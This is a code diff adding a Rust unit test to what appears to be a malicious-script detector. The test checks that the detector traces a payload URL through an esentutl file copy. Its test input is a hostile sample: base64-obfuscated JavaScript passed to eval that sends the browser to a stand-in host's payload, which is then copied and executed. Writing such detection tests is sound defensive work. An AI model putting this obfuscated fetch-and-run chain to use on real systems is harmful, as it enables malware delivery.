@@ -8915,6 +8915,28 @@ call C:\Temp\renamed.js"#,
             report.traits
         );
     }
+
+    #[test]
+    fn esentutl_directory_destination_preserves_generated_script_content() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXNlbnR1dGwtZGlyLWpzLmV4YW1wbGUvcGF5bG9hZCc=")) > original.js
+esentutl /y original.js /d C:\Temp\ /o
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://esentutl-dir-js.example/payload"
+                )
+            }),
+            "esentutl directory destination did not preserve generated JS content: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
